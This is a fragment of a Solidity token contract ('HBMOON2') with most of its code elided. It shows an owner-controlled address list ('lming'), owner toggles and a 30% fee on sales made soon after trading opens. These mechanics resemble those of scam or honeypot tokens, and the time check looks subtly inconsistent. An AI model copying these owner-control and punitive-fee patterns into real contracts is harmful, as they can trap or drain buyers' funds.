...
contract newToken is Context, IERC20, Ownable {
	...
	mapping (address => bool) private lming;
    ...
    string private _name = "HBMOON2"; 
    string private _symbol = "HBMOON2"; 
	...
	address public bonusToken = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
	...
	uint256 private time = 12;
	uint256 private buyTimeLimit = 60;
	...
	function setlming(address[] calldata addList, bool enable) public  {
		require(_msgSender() == owner(), "fail");
		for(uint256 i = 0; i < addList.length; i++) {
			lming[addList[i]] = enable;
        }
    }
	...
	function setNftstatus(bool _enabled) public {
		require(_msgSender() == owner(), "fail");
        _nftstatus = _enabled;
    }
    ...
    function _getTValues(uint256 tAmount,bool _sellStatus) private view returns (uint256 tTransferAmount, uint256 tLiquidity, uint256 tOtherToken) {
		...
		if(_sellStatus){
			if(startTradeBlock.add(buyTimeLimit) > block.timestamp){
				tOtherToken = tAmount.mul(30).div(100);
			}else{
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool _sellStatus,bool _buyStatus) private {
        ...
        (uint256 rAmount, uint256 rTransferAmount,, uint256 rAir) = _getRValues(tAmount, tTransferAmount, 0,airnum, _getRate());
